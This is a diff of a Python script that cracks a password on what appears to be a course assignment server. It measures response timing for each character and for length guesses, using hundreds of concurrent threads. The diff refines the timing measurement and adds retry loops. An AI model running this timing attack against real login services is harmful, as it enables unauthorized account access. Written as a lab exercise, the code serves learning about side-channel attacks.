@@ -1,43 +1,36 @@
 import urllib.parse
 import time
+import string
+from Timer import ThreadSafeTimer
 from concurrent.futures import ThreadPoolExecutor
 from decimal import Decimal, getcontext
 import pycurl
 import io
 import threading
+from IPython.display import clear_output
 
 _thread_local = threading.local()
 
 ### -------------------------- ###
 ### ---- Global Variables ---- ###
 ### -------------------------- ###
-DIFFICULTY = 25
+DIFFICULTY = 20
 
 BASE_URL = "aoi-assignment1.oy.ne.ro"
 SERVER_PORT = 8080
 
-CHARSET = "abcdefghijklmnopqrstuvwxyz"
+CHARSET = string.ascii_lowercase
 
 USERNAME = "326529229" # need to recieve
 
 # since threads wait for a long long time for I/O
 # it is possible and wanted to have a lot of threads
-NUMBER_OF_THREADS = 40*DIFFICULTY
+NUMBER_OF_THREADS = 20*DIFFICULTY + 300
 
 PASSWORD = ""
 LENGTH = -1
 
 getcontext().prec = 30
-
-### ------------------------- ###
-### ----- split_charset ----- ###
-### ------------------------- ###
-def split_charset():
-    """
-    this function splits the charset to chars
-    """
-    parts = [c for c in CHARSET]
-    return parts
 
 ### ------------------------- ###
 ### --- get_curl_instance --- ###
@@ -83,15 +76,20 @@ def try_pass(password):
             num_tries -= 1
             if num_tries == 0:
                 # Log the error or handle it as needed
-                raise Exception(f"[ERROR] Request timed out after multiple attempts, while trying to check Password: {password}.\nerror: {errstr}")
+                raise Exception(errstr)
 
-    total_time_sec = c.getinfo(c.TOTAL_TIME)
+    # PRETRANSFER_TIME: The time taken from the start until
+    # just before the transfer begins (includes DNS, TCP handshake, etc.).
+    pretransfer = c.getinfo(c.PRETRANSFER_TIME)
+    # STARTTRANSFER_TIME: The time from the start until
+    # the first byte is received from the server.
+    starttransfer = c.getinfo(c.STARTTRANSFER_TIME)
     http_code = c.getinfo(c.RESPONSE_CODE)
 
-    # Reset the curl object for reuse in future calls.
     c.reset()
 
-    time_ns = Decimal(total_time_sec) * Decimal(1e9)
+    server_time_sec = starttransfer - pretransfer
+    time_ns = Decimal(server_time_sec) * Decimal(1e9)
     data = int(buffer.getvalue().decode('utf-8')) == 1
 
     return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}
@@ -101,17 +99,27 @@ def try_pass(password):
 ### --- crack_password_length --- ###
 ### ----------------------------- ###
 def crack_password_length():
+    with ThreadPoolExecutor(max_workers=10) as executor:
+
+      length_timer = ThreadSafeTimer(range(33),0.2)
+      futures = []
+
+      for i in range(10):
+        for l in range(33):
+          futures.append(executor.submit(try_length, l, length_timer))
+
+      # Wait for all threads to complete
+      # outside of the loop so that each round wont have to wait on
+      # the previous one to finish
+      for future in futures:
+          future.result()
+      return length_timer.get_max_mean_key()
+
+def try_length(l, length_timer):
     # to warm up the connection
     try_pass("!")
-    maxTime = 0
-    length=-1
-    for l in range(33):
-        result = try_pass("a" * l)
-        if(result.get("Time") > maxTime):
-            maxTime = result.get("Time")
-            length=l
-    print(maxTime)
-    return length
+    result = try_pass("a" * l)
+    length_timer.record_time(l, result.get('Time'))
 
 
 ### ---------------------------- ###
@@ -130,36 +138,35 @@ def num_repetitions(discovered_length):
 ### ---- crack_next_char ----- ###
 ### -------------------------- ###
 def crack_next_char(discovered_length, executor):
-    global NUMBER_OF_THREADS
+    global NUMBER_OF_THREADS, CHARSET
     # to warm up the connection
     try_pass("!")
     r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
-    counter = CharTimer()
-    parts = split_charset()
+    char_timer = ThreadSafeTimer(CHARSET)
     futures = []
     for round in range(r):
-        for part in parts:
-            futures.append(executor.submit(worker, part, discovered_length, counter))
+        for c in CHARSET:
+            futures.append(executor.submit(try_char, c, discovered_length, char_timer))
     # Wait for all threads to complete
     # outside of the loop so that each round wont have to wait on
     # the previous one to finish
     for future in futures:
         future.result()
-    return counter.get_max_letter()
+    return char_timer.get_max_mean_key()
 
 
 
-def worker(chars, discovered_length, counter):
+def try_char(chars, discovered_length, char_timer):
     global PASSWORD, LENGTH
     if LENGTH - discovered_length == 1:
         for char in chars:
             result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
             if result.get("Data"):
-                counter.record_time(char, result.get("Time"))
+                char_timer.record_time(char, result.get("Time"))
     else:
         for char in chars:
             result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
-            counter.record_time(char, result.get("Time"))
+            char_timer.record_time(char, result.get("Time"))
 
 
 
@@ -168,29 +175,35 @@ def worker(chars, discovered_length, counter):
 ### ---- main --------------- ###
 ### ------------------------- ###
 def main():
-    global PASSWORD, LENGTH
-    start = time.perf_counter()
+    global PASSWORD, LENGTH, NUMBER_OF_THREADS
 
     correct = False
     while not correct:
-      # first step - exploit the server's length validation
-      LENGTH = crack_password_length()
-      print(f"Password length: {LENGTH}")
-      # second step - crack the password char by char
-      discovered_length = 0
-      with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
-          while len(PASSWORD) < LENGTH:
-              ch, t = crack_next_char(discovered_length, executor)
-              PASSWORD += ch
-              discovered_length += 1
-              print(f"Password so far: {PASSWORD} char time: {t}")
-      correct = try_pass(PASSWORD).get('Data')
-
-
-    end = time.perf_counter()
-    print("-------------------")
-    print(try_pass(PASSWORD))
-    print(f"total time took: {(end-start)/60} minutes")
+      print("...Cracking Password..." , end="\n\n")
+      print("Password - " , end="")
+      try:
+        # first step - exploit the server's length validation
+        LENGTH, time_for_length = crack_password_length()
+        # second step - crack the password char by char
+        discovered_length = 0
+        char_times = []
+        with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
+            while len(PASSWORD) < LENGTH:
+                ch, t = crack_next_char(discovered_length, executor)
+                PASSWORD += ch
+                discovered_length += 1
+                char_times.append(t)
+                print(ch, end="")
+        correct = try_pass(PASSWORD).get('Data')
+        if not correct:
+          print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
+          time.sleep(3)
+          clear_output()
+      except Exception as e:
+        print(f"\n[ERROR] Connection reset by the server - {e}")
+        print("trying again...")
+        time.sleep(3)
+        clear_output()
 
 
 if __name__ == '__main__':
